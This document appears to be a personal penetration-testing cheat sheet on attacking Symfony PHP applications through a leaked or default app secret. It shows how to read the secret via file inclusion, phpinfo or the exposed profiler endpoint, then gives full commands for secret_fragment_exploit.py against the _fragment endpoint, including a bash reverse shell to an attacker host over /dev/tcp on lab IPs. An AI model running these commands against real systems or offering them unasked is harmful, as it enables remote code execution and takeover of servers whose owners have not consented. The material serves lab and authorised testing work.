# Symfony

Symfony is based on PHP. You can get arbitrary code execution if you have the secret. It is often a default value. This script will help brute force common secrets, or if you have it, to use it for code execution.

Here are some of the other vulnerabilities from Synk

[symfony/symfony vulnerabilities | Snyk](https://security.snyk.io/package/composer/symfony%2Fsymfony)

Also file disclosure on exploitdb

[https://www.exploit-db.com/exploits/18560](https://www.exploit-db.com/exploits/18560)

And more info on hacktricks

[Symfony](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/symphony)

# Finding the secret

If you have LFI or otherwise file read, check `app/config/parameters.yml` and `.env` for the secret. 

************************************************************************Keep in mind that HackTricks explains some easy ways to find the secret.************************************************************************

Check phpinfo

![Untitled](Symfony%2071289a32f1b844b0a7dbb8622a9e2e40/Untitled.png)

It could be there if the environmental variables show.

An alternative is visiting [`http://192.168.126.233/app_dev.php/_profiler/open?file=app/config/parameters.yml`](http://192.168.126.233/app_dev.php/_profiler/open?file=app/config/parameters.yml) to expose the secret

![Untitled](Symfony%2071289a32f1b844b0a7dbb8622a9e2e40/Untitled%201.png)

## Exploitation

Once you have the secret, you can exploit the rce with this command.

```jsx
python secret_fragment_exploit.py -s "48a8538e6260789558f0dfe29861c05b" 'http://192.168.126.233/_fragment' --method 2 -f system --parameters 'id' --algo 'sha256' --internal-url 'http://192.168.126.233/_fragment'
```

![Untitled](Symfony%2071289a32f1b844b0a7dbb8622a9e2e40/Untitled%202.png)

Copy the link and visit it in your browser to execute the code

![Untitled](Symfony%2071289a32f1b844b0a7dbb8622a9e2e40/Untitled%203.png)

You can execute this one for a shell 

```jsx
python secret_fragment_exploit.py -s "48a8538e6260789558f0dfe29861c05b" 'http://192.168.126.233/_fragment' --method 2 -f system --parameters 'bash -c "bash -i >& /dev/tcp/192.168.49.126/80 0>&1"' --algo 'sha256' --internal-url 'http://192.168.126.233/_fragment'
```